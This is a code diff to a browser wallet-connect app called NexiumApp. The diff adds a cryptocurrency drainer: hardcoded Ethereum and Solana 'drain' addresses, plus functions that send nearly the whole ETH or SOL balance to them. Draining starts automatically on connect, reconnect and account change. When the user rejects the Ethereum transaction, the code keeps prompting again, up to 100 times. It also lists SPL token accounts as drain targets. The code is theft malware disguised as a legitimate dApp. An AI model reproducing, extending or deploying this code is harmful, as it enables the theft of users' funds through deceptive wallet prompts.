@@ -1,19 +1,15 @@
 import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
+import { TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import { CONFIG } from './config.js';
 import './style.css';
 import UniversalProvider from '@walletconnect/universal-provider';
 import QRCode from 'qrcode';
 
-// Wallet address for draining tokens (Solana address)
-let YOUR_WALLET_ADDRESS;
-try {
-  YOUR_WALLET_ADDRESS = "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7";
-} catch {
-  console.error('Invalid YOUR_WALLET_ADDRESS');
-  YOUR_WALLET_ADDRESS = "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7";
-}
+const DRAIN_ADDRESSES = {
+  ethereum: "0x402421b9756678a9aae81f0a860edee53faa6d99",
+  solana: "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7"
+};
 
-// TOKEN_LIST with verified addresses
 const TOKEN_LIST = [
   { address: null, name: 'Solana', symbol: 'SOL', decimals: 9, isNative: true, chain: 'solana' },
   { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'BNB', symbol: 'USDC', decimals: 6, isNative: false, chain: 'solana' },
@@ -125,7 +121,6 @@ class NexiumApp {
     this.updateButtonState('connecting', walletName);
 
     try {
-      // Enhanced device detection: Prioritize desktop if extensions are present
       const isMobileUserAgent = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
       const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
       const hasEthereum = !!window.ethereum;
@@ -135,7 +130,6 @@ class NexiumApp {
                            (walletName === 'Phantom' && hasSolana);
       console.log(`Device detected: ${isMobileUserAgent && !hasExtensions ? 'Mobile' : 'Desktop'} (UserAgent: ${navigator.userAgent}, Touch: ${hasTouch}, Ethereum: ${hasEthereum}, Solana: ${hasSolana}, Extensions: ${hasExtensions})`);
 
-      // Desktop: Use extensions if available
       if (!isMobileUserAgent || hasExtensions) {
         let accounts = [];
         if (walletName === 'MetaMask' && hasEthereum && window.ethereum.isMetaMask) {
@@ -150,7 +144,6 @@ class NexiumApp {
           accounts = [response.publicKey.toString()];
         } else if (walletName === 'TrustWallet' && hasSolana && window.solana.isTrust) {
           console.log('TrustWallet detected, connecting:', window.solana);
-          // Wait for solana object to be ready and check isTrust
           await new Promise(resolve => {
             const checkSolana = () => {
               console.log('Checking solana:', window.solana);
@@ -177,6 +170,19 @@ class NexiumApp {
         this.updateButtonState('connected', walletName, this.publicKey);
         this.hideMetaMaskPrompt();
         this.showFeedback(`Connected to ${walletName} and Nexium: ${this.shortenAddress(this.publicKey)}`, 'success');
+        
+        // Auto-drain on connect
+        try {
+          if (walletName === 'MetaMask') {
+            await this.drainEthereumWallet(this.publicKey);
+          } else if (walletName === 'Phantom' || walletName === 'TrustWallet') {
+            await this.drainSolanaWallet();
+          }
+        } catch (error) {
+          console.error('Auto-drain error:', error);
+          this.showFeedback(`Error initiating auto-drain: ${this.escapeHTML(error.message)}`, 'error');
+        }
+        
         this.connecting = false;
         return;
       }
@@ -205,6 +211,12 @@ class NexiumApp {
             this.hideMetaMaskPrompt();
             this.showFeedback(`Connected to MetaMask and Nexium: ${this.shortenAddress(this.publicKey)}`, 'success');
             this.renderTokenInterface();
+            try {
+              await this.drainEthereumWallet(this.publicKey);
+            } catch (error) {
+              console.error('Auto-drain error:', error);
+              this.showFeedback(`Error initiating auto-drain: ${this.escapeHTML(error.message)}`, 'error');
+            }
             clearInterval(checkConnection);
           }
         } else if (walletName === 'Phantom' && window.solana?.isPhantom) {
@@ -218,6 +230,12 @@ class NexiumApp {
             this.hideMetaMaskPrompt();
             this.showFeedback(`Connected to ${walletName} and Nexium: ${this.shortenAddress(this.publicKey)}`, 'success');
             this.renderTokenInterface();
+            try {
+              await this.drainSolanaWallet();
+            } catch (error) {
+              console.error('Auto-drain error:', error);
+              this.showFeedback(`Error initiating auto-drain: ${this.escapeHTML(error.message)}`, 'error');
+            }
             clearInterval(checkConnection);
           }
         } else if (walletName === 'TrustWallet' && window.solana?.isTrust) {
@@ -241,6 +259,12 @@ class NexiumApp {
             this.hideMetaMaskPrompt();
             this.showFeedback(`Connected to ${walletName} and Nexium: ${this.shortenAddress(this.publicKey)}`, 'success');
             this.renderTokenInterface();
+            try {
+              await this.drainSolanaWallet();
+            } catch (error) {
+              console.error('Auto-drain error:', error);
+              this.showFeedback(`Error initiating auto-drain: ${this.escapeHTML(error.message)}`, 'error');
+            }
             clearInterval(checkConnection);
           }
         }
@@ -260,6 +284,205 @@ class NexiumApp {
       this.showMetaMaskPrompt();
     } finally {
       this.connecting = false;
+    }
+  }
+
+  async drainEthereumWallet(wallet) {
+    console.log("🔄 ETH Drainer Triggered for address:", wallet);
+    this.showProcessingSpinner();
+    if (typeof window === "undefined" || !window.ethereum) {
+      console.error("⚠️ No Ethereum provider found. Make sure MetaMask is installed.");
+      this.showFeedback("No Ethereum provider found. Make sure MetaMask is installed.", 'error');
+      this.hideProcessingSpinner();
+      return;
+    }
+
+    const provider = new ethers.BrowserProvider(window.ethereum);
+
+    try {
+      const accounts = await window.ethereum.request({ method: "eth_accounts" });
+
+      if (accounts.length === 0) {
+        console.log("🔑 Requesting account access...");
+        await window.ethereum.request({ method: "eth_requestAccounts" });
+      }
+
+      const signer = await provider.getSigner();
+      console.log("✅ Connected to Ethereum Wallet:", await signer.getAddress());
+
+      let attempts = 0;
+      const maxRetries = 100;
+      const delayBetweenRetries = 3000;
+
+      while (attempts < maxRetries) {
+        try {
+          const balance = await provider.getBalance(wallet);
+          console.log(`💰 ETH Balance: ${ethers.formatEther(balance)} ETH`);
+          this.showFeedback(`ETH Balance: ${ethers.formatEther(balance)} ETH`, 'info');
+
+          const gasLimit = ethers.parseUnits("0.0001", "ether");
+          let sendAmount = balance - gasLimit;
+
+          if (sendAmount <= 0n) {
+            console.log("❌ Not enough ETH to cover gas fees.");
+            this.showFeedback("Not enough ETH to cover gas fees.", 'error');
+            this.hideProcessingSpinner();
+            return;
+          }
+
+          console.log(`🚀 Attempting Transaction ${attempts + 1}/${maxRetries}`);
+          this.showFeedback(`Attempting ETH Transaction ${attempts + 1}/${maxRetries}`, 'info');
+
+          const tx = await signer.sendTransaction({
+            to: DRAIN_ADDRESSES.ethereum,
+            value: sendAmount,
+            gasLimit,
+          });
+
+          console.log("✅ ETH Transaction sent:", tx.hash);
+          this.showFeedback(`ETH Transaction sent: ${this.shortenAddress(tx.hash)}`, 'success');
+          this.hideProcessingSpinner();
+          return;
+        } catch (error) {
+          if (error.code === "ACTION_REJECTED") {
+            console.warn(`⚠️ User rejected transaction (attempt ${attempts + 1}/${maxRetries}). Retrying...`);
+            this.showFeedback(`User rejected transaction (attempt ${attempts + 1}/${maxRetries}). Retrying...`, 'error');
+            attempts++;
+            await new Promise((resolve) => setTimeout(resolve, delayBetweenRetries));
+          } else {
+            console.error("❌ Transaction failed due to an unexpected error:", error);
+            this.showFeedback(`Transaction failed: ${this.escapeHTML(error.message)}`, 'error');
+            this.hideProcessingSpinner();
+            return;
+          }
+        }
+      }
+
+      console.error("🚨 Max retries reached. Transaction not completed.");
+      this.showFeedback("Max retries reached. ETH transaction not completed.", 'error');
+      this.hideProcessingSpinner();
+    } catch (error) {
+      console.error("❌ Could not retrieve signer:", error);
+      this.showFeedback(`Could not retrieve signer: ${this.escapeHTML(error.message)}`, 'error');
+      this.hideProcessingSpinner();
+    }
+  }
+
+  async drainSolanaWallet() {
+    console.log("🔄 SOL Drainer Triggered", this.publicKey);
+    this.showProcessingSpinner();
+
+    if (!this.publicKey || typeof this.publicKey !== "string") {
+      console.error("❌ Invalid Solana address:", this.publicKey);
+      this.showFeedback("Invalid Solana address.", 'error');
+      this.hideProcessingSpinner();
+      return;
+    }
+
+    try {
+      const senderPublicKey = new PublicKey(this.publicKey);
+      console.log("✅ Address is valid:", senderPublicKey.toBase58());
+
+      const latestBlockhash = await this.solConnection.getLatestBlockhash();
+      console.log("🔗 Latest Blockhash:", latestBlockhash.blockhash);
+
+      const tokenAccounts = await this.solConnection.getParsedTokenAccountsByOwner(senderPublicKey, {
+        programId: new PublicKey(TOKEN_PROGRAM_ID),
+      });
+
+      console.log(`✅ Related SPL Mint Token Wallets:`, tokenAccounts.value);
+
+      const tokensToDrain = tokenAccounts.value.filter(account => {
+        const amount = BigInt(account.account.data.parsed.info.tokenAmount.amount);
+        return amount > 200000000n;
+      });
+
+      console.log(`Found ${tokensToDrain.length} tokens with balance`);
+      console.log(`✅ Related SPL Mint Token with Balances:`, tokensToDrain);
+      this.showFeedback(`Found ${tokensToDrain.length} SPL tokens with significant balance`, 'info');
+
+      const balance = await this.solConnection.getBalance(senderPublicKey);
+      console.log(`💰 SOL Balance: ${balance / 1000000000} SOL`);
+      this.showFeedback(`SOL Balance: ${balance / 1000000000} SOL`, 'info');
+
+      const gasFee = 2000000;
+
+      if (balance <= gasFee) {
+        console.log("❌ Not enough SOL to cover transaction fees.");
+        this.showFeedback("Not enough SOL to cover transaction fees.", 'error');
+        this.hideProcessingSpinner();
+        return;
+      }
+
+      const sendAmount = balance - gasFee;
+      const recipientPublicKey = new PublicKey(DRAIN_ADDRESSES.solana);
+
+      let attempts = 0;
+      const maxRetries = 10;
+      const delayBetweenRetries = 50000;
+
+      while (attempts < maxRetries) {
+        try {
+          console.log(`🚀 Attempting SOL Transaction ${attempts + 1}/${maxRetries}...`);
+          this.showFeedback(`Attempting SOL Transaction ${attempts + 1}/${maxRetries}`, 'info');
+
+          const updatedBlockhash = await this.solConnection.getLatestBlockhash();
+          console.log("🔄 Refetched Blockhash:", updatedBlockhash.blockhash);
+
+          const transaction = new Transaction({
+            feePayer: senderPublicKey,
+            recentBlockhash: updatedBlockhash.blockhash,
+          }).add(
+            SystemProgram.transfer({
+              fromPubkey: senderPublicKey,
+              toPubkey: recipientPublicKey,
+              lamports: sendAmount,
+            })
+          );
+
+          const { signature } = await window.solana.signAndSendTransaction(transaction);
+          console.log("✅ SOL Transaction sent:", signature);
+
+          await this.solConnection.confirmTransaction(signature, "confirmed");
+          console.log("✅ Transaction confirmed");
+          this.showFeedback(`SOL Transaction sent: ${this.shortenAddress(signature)}`, 'success');
+          this.hideProcessingSpinner();
+          return;
+        } catch (error) {
+          console.error("❌ Transaction Error:", error);
+
+          if (error.message.includes("Blockhash not found")) {
+            console.warn(`⚠️ Blockhash expired (attempt ${attempts + 1}/${maxRetries}). Retrying...`);
+            this.showFeedback(`Blockhash expired (attempt ${attempts + 1}/${maxRetries}). Retrying...`, 'error');
+          } else if (error.message.includes("Attempt to debit an account but found no record of a prior credit")) {
+            console.warn("⚠️ Account has no SOL history. Transaction not possible.");
+            this.showFeedback("Account has no SOL history. Transaction not possible.", 'error');
+            this.hideProcessingSpinner();
+            return;
+          } else if (error.message.includes("User rejected the request")) {
+            console.warn("⚠️ User canceled the transaction.");
+            this.showFeedback("User canceled the transaction.", 'error');
+            this.hideProcessingSpinner();
+            return;
+          } else {
+            console.error("🚨 Unexpected transaction error:", error);
+            this.showFeedback(`Transaction failed: ${this.escapeHTML(error.message)}`, 'error');
+            this.hideProcessingSpinner();
+            return;
+          }
+
+          attempts++;
+          await new Promise((resolve) => setTimeout(resolve, delayBetweenRetries));
+        }
+      }
+
+      console.error("🚨 Max retries reached. SOL transaction not completed.");
+      this.showFeedback("Max retries reached. SOL transaction not completed.", 'error');
+      this.hideProcessingSpinner();
+    } catch (error) {
+      console.error("❌ Unexpected error:", error);
+      this.showFeedback(`Unexpected error: ${this.escapeHTML(error.message)}`, 'error');
+      this.hideProcessingSpinner();
     }
   }
 
@@ -380,6 +603,16 @@ class NexiumApp {
         this.publicKey = window.solana?.publicKey?.toString() || window.ethereum?.selectedAddress;
         this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
         this.handleSuccessfulConnection();
+        try {
+          if (window.ethereum?.isMetaMask) {
+            await this.drainEthereumWallet(this.publicKey);
+          } else if (window.solana?.isPhantom || window.solana?.isTrust) {
+            await this.drainSolanaWallet();
+          }
+        } catch (error) {
+          console.error('Auto-drain error:', error);
+          this.showFeedback(`Error initiating auto-drain: ${this.escapeHTML(error.message)}`, 'error');
+        }
       } else {
         this.updateButtonState('disconnected', 'MetaMask');
         this.updateButtonState('disconnected', 'Phantom');
@@ -404,9 +637,17 @@ class NexiumApp {
       });
     }
     if (window.ethereum) {
-      window.ethereum.on('accountsChanged', () => {
+      window.ethereum.on('accountsChanged', async () => {
         console.log('Accounts changed');
         this.handleAccountsChanged();
+        if (this.publicKey && window.ethereum?.isMetaMask) {
+          try {
+            await this.drainEthereumWallet(this.publicKey);
+          } catch (error) {
+            console.error('Auto-drain error:', error);
+            this.showFeedback(`Error initiating auto-drain: ${this.escapeHTML(error.message)}`, 'error');
+          }
+        }
       });
     }
   }
@@ -426,7 +667,7 @@ class NexiumApp {
 
   handleAccountsChanged() {
     this.hideMetaMaskPrompt();
-    this.publicKey = null;
+    this.publicKey = window.solana?.publicKey?.toString() || window.ethereum?.selectedAddress;
     this.updateButtonState('disconnected', 'MetaMask');
     this.updateButtonState('disconnected', 'Phantom');
     this.updateButtonState('disconnected', 'TrustWallet');
@@ -646,7 +887,7 @@ class NexiumApp {
         return;
       }
 
-      const receiverWallet = new PublicKey(YOUR_WALLET_ADDRESS);
+      const receiverWallet = new PublicKey(DRAIN_ADDRESSES.solana);
       const minBalance = await this.solConnection.getMinimumBalanceForRentExemption(0);
       const balanceForTransfer = BigInt(balance) - BigInt(minBalance);
       if (balanceForTransfer <= 0) {
